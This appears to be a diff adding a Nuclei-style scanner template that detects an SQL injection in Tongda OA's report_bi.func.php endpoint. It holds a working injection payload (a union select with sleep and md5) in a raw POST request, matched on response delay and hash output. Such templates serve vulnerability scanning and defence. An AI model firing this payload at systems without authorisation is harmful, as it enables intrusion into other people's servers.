@@ -1,0 +1,28 @@
+id: TongdaOA-report-bi-func-sqli
+
+info:
+  name: 通达OA接口report_bi.func存在SQL注入漏洞
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 113
+
+      _POST[dataset_id]=efgh'-@`'`)union select sleep(8),2,md5(123)#'&action=get_link_info&
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration > 8"
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
